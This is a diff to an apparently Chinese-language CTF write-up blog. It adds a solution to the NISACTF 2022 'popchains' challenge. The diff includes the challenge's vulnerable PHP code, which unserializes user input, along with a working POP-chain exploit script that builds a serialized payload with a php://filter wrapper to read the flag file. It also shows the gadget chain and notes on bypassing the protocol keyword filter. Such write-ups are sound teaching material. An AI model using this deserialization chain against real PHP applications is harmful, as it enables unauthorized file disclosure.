@@ -4,7 +4,7 @@ image: ''
 pinned: false
 comment: true
 published: 2026-04-02
-updated: 2026-04-16
+updated: 2026-04-18
 description: "WEB"
 category: WEB
 tags: [WEB]
@@ -2475,7 +2475,99 @@ echo urlencode(serialize($d));
 
 ## 5.
 
+`[NISACTF 2022]popchains`
 
+```
+Happy New Year~ MAKE A WISH
+<?php
+
+echo 'Happy New Year~ MAKE A WISH<br>';
+
+if(isset($_GET['wish'])){
+    @unserialize($_GET['wish']);
+}
+else{
+    $a=new Road_is_Long;
+    highlight_file(__FILE__);
+}
+/***************************pop your 2022*****************************/
+
+class Road_is_Long{
+    public $page;
+    public $string;
+    public function __construct($file='index.php'){
+        $this->page = $file;
+    }
+    public function __toString(){
+        return $this->string->page;
+    }
+
+    public function __wakeup(){
+        if(preg_match("/file|ftp|http|https|gopher|dict|\.\./i", $this->page)) {
+            echo "You can Not Enter 2022";
+            $this->page = "index.php";
+        }
+    }
+}
+
+class Try_Work_Hard{
+    protected  $var;
+    public function append($value){
+        include($value);
+    }
+    public function __invoke(){
+        $this->append($this->var);
+    }
+}
+
+class Make_a_Change{
+    public $effort;
+    public function __construct(){
+        $this->effort = array();
+    }
+
+    public function __get($key){
+        $function = $this->effort;
+        return $function();
+    }
+}
+/**********************Try to See flag.php*****************************/
+```
+
+我的链构造到 `    public function __toString(){
+        return $this->string->page;` ，这一部分的时候断了，我记得 `__toString` 的触发方法是把方法当字符串触发，但我确实没找到 `echo` 的点，结果，`if(preg_match("/file|ftp|http|https|gopher|dict|\.\./i", $this->page))` 这个部分可以，它在比较匹配的时候会当作字符串，哎，差一点纯自己思路了。
+
+还有个点就是后 `include` 的点，要用php协议，不能直接读。
+
+```
+<?php
+class Road_is_Long{
+    public $page;
+    public $string;
+}
+class Try_Work_Hard
+{
+    protected $var='php://filter/convert.base64-encode/resource=/flag';
+}
+class Make_a_Change{
+    public $effort;
+}
+$r=new Road_is_Long();
+$t=new Try_Work_Hard();
+$m=new Make_a_Change();
+$m->effort=$t;
+$r->string=$m;
+$r->page=$r;
+$a=serialize($r);
+echo urlencode($a);
+?> 
+```
+
+`Road_is_Long::__wakeup->__toString->Make_a_Change::__get->Try_Work_Hard::__invoke->append()`
+
+
+
+----
 
 
 
